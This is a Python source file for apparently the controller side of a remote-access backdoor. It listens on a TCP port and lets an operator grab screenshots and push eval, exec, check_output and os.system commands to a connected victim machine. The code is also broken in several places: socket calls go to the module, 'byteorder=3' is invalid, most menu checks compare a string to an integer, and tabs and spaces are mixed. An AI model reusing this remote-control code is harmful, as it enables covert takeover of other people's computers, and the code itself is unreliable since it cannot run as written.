import socket as s
con2 = '', 5557

def recvall(conn, length):
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))
        if not data:
            return data
        buf += data
    return buf

with s.socket(s.AF_INET, s.SOCK_STREAM) as sock:
    s.bind(con2)
    s.listen(0)
    print('Server started @ ' + str(con2[0]) + ':' + str(con2[1]))
    sock, addr = s.accept()
    print('Client connected IP:', addr)
    print('0: ss, 1: eval, 2: exec, 3: check_output, 4: os.system, 5: help, 6: exit')
    while True:
        ch = input('>>> ').strip()
        if ch=='0':
            try:
                rr = int(input('Enter resize ratio: '))
            except Exception as exc:
                print('Fuck you.')
                continue
            sock.sendall(bytes([0, rr]))
            bs = recvall(sock, int.from_bytes(sock.recv(3), byteorder=3))
            try:
                from PIL import Image
                from io import BytesIO
                img = Image.open(BytesIO(bs))
                img.show()
            except Exception as exc:
                print(exc)
        elif ch==1:
            cmd = input('>> ').encode('utf-16')
            sock.send(b'\x01')
            sock.sendall(len(cmd).to_bytes(length=2, byteorder='big'))
            sock.sendall(cmd)
            if sock.recv(1)==b'\x00':
                lenleng = sock.recv(1)[0]
                leng = int.from_bytes(sock.recv(lenleng), byteorder='big')
                bs = sock.recv(leng)
                print(bs)
            else:
                leng = int.from_bytes(sock.recv(2), byteorder='big')
                bs = sock.recv(leng)
                print(bs.decode('utf-16'))
        elif ch==2:
            cmd = input('>> ').encode('utf-16')
            sock.send(b'\x02')
            sock.sendall(len(cmd).to_bytes(length=2, byteorder='big'))
            sock.sendall(cmd)
            if sock.recv(1)==b'\xff':
            	leng = int.from_bytes(sock.recv(2), byteorder='big')
                bs = sock.recv(leng)
                print(bs.decode('utf-16'))
            else:
                print('No error')
        elif ch==3:
        	cmd = input('>> ').encode('utf-16')
        	sock.send(b'\x03')
            sock.sendall(len(cmd).to_bytes(length=2, byteorder='big'))
            sock.sendall(cmd)
            if sock.recv(1)==b'\x00':
                lenleng = sock.recv(1)[0]
                leng = int.from_bytes(sock.recv(lenleng), byteorder='big')
                bs = sock.recv(leng)
                try:
                	bs = bs.decode()
                except:
                	pass
                print(bs)
            else:
                leng = int.from_bytes(sock.recv(2), byteorder='big')
                bs = sock.recv(leng)
                print(bs.decode('utf-16'))
        elif ch==4:
        	cmd = input('>> ').encode('utf-16')
            sock.send(b'\x04')
            sock.sendall(len(cmd).to_bytes(length=2, byteorder='big'))
            sock.sendall(cmd)
            if sock.recv(1)==b'\xff':
            	leng = int.from_bytes(sock.recv(2), byteorder='big')
                bs = sock.recv(leng)
                print(bs.decode('utf-16'))
            else:
                print('No error')
        elif ch==5:
        	print('0: ss, 1: eval, 2: exec, 3: check_output, 4: os.system, 5: help, 6: exit')
        elif ch==6:
        	break
        else:
        	print('Fuck you.')
